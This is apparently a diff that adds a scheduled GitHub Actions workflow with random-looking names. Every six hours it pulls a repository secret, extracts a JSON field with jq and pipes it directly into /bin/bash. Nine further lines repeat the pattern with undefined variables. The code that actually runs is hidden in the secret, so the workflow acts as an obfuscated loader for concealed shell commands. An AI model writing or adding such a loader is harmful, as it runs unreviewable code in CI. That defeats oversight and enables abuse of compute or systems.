@@ -1,0 +1,27 @@
+name: xiaoyongsha
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '41 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiaoyongsha
+        env:
+          vjlgb8: ${{ secrets.vjlgb8 }}
+        run: |
+          echo $vjlgb8 | jq -r .ong6 | /bin/bash
+          echo $ftn8 | jq -r .bagi36 | /bin/bash
+          echo $mto9 | jq -r .rj952 | /bin/bash
+          echo $izv0336 | jq -r .fd49 | /bin/bash
+          echo $yx8743 | jq -r .f26848 | /bin/bash
+          echo $zs3 | jq -r .lang48697 | /bin/bash
+          echo $hmhll9505 | jq -r .tgd376 | /bin/bash
+          echo $ntk2 | jq -r .kj6 | /bin/bash
+          echo $j91 | jq -r .nc3 | /bin/bash
+          echo $t93 | jq -r .pvspr10757 | /bin/bash
+
